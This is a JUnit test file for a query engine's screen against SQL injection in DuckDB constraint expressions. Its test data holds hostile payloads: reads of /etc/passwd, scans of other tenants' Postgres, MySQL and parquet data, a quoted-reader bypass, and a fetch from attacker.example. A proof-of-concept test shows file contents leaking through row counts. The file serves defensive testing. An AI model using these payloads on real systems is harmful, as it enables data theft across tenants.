package edu.upc.dtak.aran.operators.queryengine;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * A model constraint is attacker-controlled SQL that runs inside the engine.
 *
 * <p>{@code DuckDbExecutor.buildDdl} splices the expression verbatim into the {@code WHERE}
 * clause of three view definitions per class — {@code u_}, {@code int_} and {@code q_} — and
 * every query then reads those views. Until this test existed, the only screen was a check for
 * {@code ;}, {@code --} and {@code /*}, which blocks statement chaining and says nothing at all
 * about what a single predicate may call.
 *
 * <p>{@link #theExploitStillWorksAgainstDuckDb} is deliberately not a guard test: it demonstrates
 * the primitive against a real DuckDB, so the guard tests below are anchored to something that
 * actually happens rather than to a hypothesis.
 */
class ConstraintInjectionTest {

    private static final String CLS = "http://example.com/Person";
    private static final String NAME = "http://example.com/name";

    // ── The screen ───────────────────────────────────────────────────────────

    @ParameterizedTest
    @ValueSource(strings = {
            "name <> (SELECT col FROM read_csv_auto('/etc/passwd') LIMIT 1)",
            "name IN (SELECT name FROM postgres_scan('host=db', 'public', 'tenant'))",
            "name <> (SELECT c FROM read_parquet('/srv/other-tenant.parquet') LIMIT 1)",
            "name <> (SELECT c FROM read_json_auto('https://attacker.example/x') LIMIT 1)",
            "length(name) > (SELECT count(*) FROM mysql_scan('host=db', 'users'))",
    })
    @DisplayName("a constraint that reaches outside the class's own columns is rejected")
    void exfiltrationAttemptsAreRejected(String expression) {
        assertThat(QueryEngineOperator.rejectConstraintExpression(expression))
                .as("expression must not be accepted: %s", expression)
                .isNotNull()
                .contains("Forbidden construct");
    }

    @ParameterizedTest
    @ValueSource(strings = {
            // No function call appears in any of these: DuckDB's replacement scan turns a bare
            // string literal in FROM position into a read_csv. The name-based screen was blind
            // to it, so the constraint path had the same hole the `run` operation did.
            "name <> (SELECT col FROM '/etc/passwd.csv' LIMIT 1)",
            // No leading '/*' in the glob: that sequence is already refused by the punctuation
            // guard above, which would mask whether the construct screen sees this at all.
            "name <> (SELECT col FROM '/srv/aran-snapshot-cache-x.parquet' LIMIT 1)",
            // Quoting the reader's name hid it from a regex that matched `name(`.
            "name <> (SELECT col FROM \"read_csv_auto\"('/etc/passwd') LIMIT 1)",
    })
    @DisplayName("a constraint that reaches the filesystem without naming a reader is rejected")
    void replacementScansAndQuotedReadersAreRejected(String expression) {
        assertThat(QueryEngineOperator.rejectConstraintExpression(expression))
                .as("expression must not be accepted: %s", expression)
                .isNotNull()
                .contains("Forbidden construct");
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "h_index >= 0",
            "name IS NOT NULL",
            "length(name) BETWEEN 1 AND 200",
            "upper(name) <> 'UNKNOWN'",
            "year > 2000 AND year <= 2030",
            "name LIKE 'Dr %' OR title IS NULL",
    })
    @DisplayName("ordinary predicates over the class's own columns still pass")
    void legitimateConstraintsAreAccepted(String expression) {
        assertThat(QueryEngineOperator.rejectConstraintExpression(expression))
                .as("expression should be accepted: %s", expression)
                .isNull();
    }

    @Test
    @DisplayName("statement chaining and comment injection stay blocked")
    void punctuationGuardIsRetained() {
        assertThat(QueryEngineOperator.rejectConstraintExpression("1=1; DROP TABLE x"))
                .contains("';'");
        assertThat(QueryEngineOperator.rejectConstraintExpression("1=1 -- rest"))
                .contains("'--'");
        assertThat(QueryEngineOperator.rejectConstraintExpression("1=1 /* rest */"))
                .contains("/*");
        assertThat(QueryEngineOperator.rejectConstraintExpression("  ")).contains("empty");
    }

    @Test
    @DisplayName("the screen runs before the class lookup, so an unknown class is not a bypass")
    void screenIsNotSkippedForUnknownClasses() {
        // validateConstraint short-circuits to success("validated","false") when the class is not
        // in the active catalog — its columns are unknown, so identifiers cannot be checked. That
        // branch must sit *after* this screen, or "name a class that isn't compiled yet" is a
        // complete bypass. Pinning the screen as a standalone function is what makes that
        // ordering testable at all.
        assertThat(QueryEngineOperator.rejectConstraintExpression(
                "x <> (SELECT c FROM read_csv_auto('/etc/passwd') LIMIT 1)"))
                .isNotNull();
    }

    // ── The primitive the screen exists to stop ──────────────────────────────

    @Test
    @DisplayName("unscreened, the expression really does read a server file through DuckDB")
    void theExploitStillWorksAgainstDuckDb() throws Exception {
        Path secret = Files.createTempFile("aran-test-secret-", ".csv");
        Path data = Files.createTempFile("aran-test-data-", ".json");
        try {
            Files.writeString(secret, "col\ns3cr3t\n");
            Files.writeString(data, """
                    {"n":"s3cr3t"}
                    {"n":"innocent"}
                    """);

            String expression = "name <> (SELECT col FROM read_csv_auto('"
                    + secret.toAbsolutePath().toString().replace("'", "''") + "') LIMIT 1)";

            var cls = new MappingCatalog.IntegratedClass(CLS, List.of(
                    new MappingCatalog.SourceView("ds", "SELECT * FROM ${SNAPSHOT}",
                            Map.of(NAME, "n"), 2)));
            var catalog = new MappingCatalog(Map.of(CLS, cls), List.of(), List.of(), "v1");
            DuckDbExecutor.SnapshotResolver resolver =
                    d -> "read_json_auto('" + data.toAbsolutePath() + "')";

            try (DuckDbExecutor exec = new DuckDbExecutor(
                    catalog, resolver, Map.of(CLS, List.of(expression)))) {
                exec.prepare();
                List<List<Object>> rows = exec.run("SELECT * FROM int_Person").rows();

                // The row whose value equals the file's first line was filtered out; the other
                // survived. Row count is the oracle: one guessed prefix per constraint edit reads
                // the file a character at a time. Slow, not safe.
                assertThat(rows)
                        .as("the file was read and its contents decided which rows survived")
                        .hasSize(1);
                assertThat(String.valueOf(rows.get(0).get(0))).isEqualTo("innocent");
            }

            // …and this is what now stops it reaching that point.
            assertThat(QueryEngineOperator.rejectConstraintExpression(expression)).isNotNull();
        } finally {
            Files.deleteIfExists(secret);
            Files.deleteIfExists(data);
        }
    }
}
